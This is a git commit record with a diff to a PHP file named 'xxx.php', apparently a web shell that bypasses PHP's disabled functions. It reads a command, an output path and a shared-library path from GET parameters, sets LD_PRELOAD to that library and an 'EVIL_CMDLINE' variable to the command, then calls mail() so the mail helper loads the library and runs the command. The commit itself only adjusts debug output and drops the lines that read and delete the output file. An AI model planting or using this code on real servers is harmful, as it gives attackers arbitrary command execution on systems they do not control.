aa345efb3e85cd302be6ba4bd259257f047e4bc4
blackstar24 <chenxupin@163.com>
2019-08-15 15:01:34 +0800

    Update xxx.php

--- xxx.php
+++ xxx.php
@@ -2,12 +2,12 @@
     $cmd = $_GET["cmd"];
     $out_path = $_GET["outpath"];
     $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
-    echo "cmdline".$evil_cmdline;
+    echo "cmdline ".$evil_cmdline."<br>";
     putenv("EVIL_CMDLINE=" . $evil_cmdline);
     $so_path = $_GET["sopath"];
     putenv("LD_PRELOAD=" . $so_path);
-    echo getenv('LD_PRELOAD');
+    echo getenv('LD_PRELOAD')."<br>";
+    echo getenv('EVIL_CMDLINE')."<br>";
+
     mail("", "", "", "");
-    echo "output" . nl2br(file_get_contents($out_path)); 
-    unlink($out_path);
 ?>
